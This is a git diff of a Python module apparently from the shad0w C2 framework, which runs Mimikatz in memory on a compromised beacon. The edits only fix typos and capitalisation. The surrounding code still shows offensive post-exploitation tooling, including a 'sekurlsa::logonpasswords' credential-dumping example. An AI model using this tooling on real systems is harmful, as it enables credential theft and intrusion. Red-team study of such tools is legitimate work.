@@ -6,13 +6,13 @@ import argparse
 
 from lib import shellcode
 
-__description__ = "Execute mimikatz commands in memory on the target"
+__description__ = "Execute Mimikatz commands in memory on the target"
 __author__ = "@_batsec_, @gentilkiwi"
 
 # identify the task as shellcode execute
 USERCD_EXEC_ID = 0x3000
 
-# location of mimikatz binary
+# location of Mimikatz binary
 MIMIKATZ_BIN = "/root/shad0w/bin/mimikatz.x64.exe"
 
 # did the command error
@@ -46,7 +46,7 @@ def main(shad0w, args):
 
     # check we actually have a beacon
     if shad0w.current_beacon is None:
-        shad0w.debug.log("ERROR: No active beacon", log=True)
+        shad0w.debug.log("ERROR: No active beacon.", log=True)
         return
 
     # usage examples
@@ -72,7 +72,7 @@ mimikatz -x sekurlsa::logonpasswords
     parse.add_argument("-x", "--execute", nargs='+', required=True, help="Mimikatz command to execute")
     parse.add_argument("-n", "--no-exit", action="store_true", required=False, help="Leave mimikatz running")
 
-    # make sure we dont die from weird args
+    # make sure we don't die from weird args
     try:
         args = parse.parse_args(args[1:])
     except:
@@ -90,7 +90,7 @@ mimikatz -x sekurlsa::logonpasswords
         if not args.no_exit:
             params = params + " exit"
         
-        # kinda a hack to make sure we intergrate nice with the shellcode generator 
+        # kind of a hack to make sure we integrate nice with the shellcode generator
         args.param = args.execute
         args.cls = False
         args.method = False
